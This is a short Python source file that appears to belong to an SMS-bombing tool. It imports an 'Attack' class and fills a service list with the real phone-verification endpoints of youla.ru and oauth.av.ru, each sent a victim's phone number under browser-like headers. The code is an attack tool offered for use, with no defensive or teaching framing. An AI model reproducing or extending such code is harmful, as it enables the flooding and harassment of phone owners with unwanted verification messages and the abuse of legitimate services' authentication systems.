from attack import Attack
from serviceModel import ServiceModel

class Model:

    def __init__(self):
        self.services = []
        self.attack_service = Attack()

    def fillServices(self, phone):
        youla = ServiceModel(
            url = 'https://youla.ru/web-api/auth/request_code',
            data = { 'phone' : phone },
            headers = {
                'Accept-Language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection':'keep-alive',
                'Host':'youla.ru',
                'origin':'https://youla.ru',
                'Referer':'https://youla.ru/'}
        )
        azbuka_vkusa = ServiceModel(
            url = 'https://oauth.av.ru/check-phone',
            data = { 'phone' : phone },
            headers = {
                'Accept-Language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'origin':'https://oauth.av.ru',
                'Referer':'https://oauth.av.ru/'
             }
        )
        self.services.append(youla)
        self.services.append(azbuka_vkusa)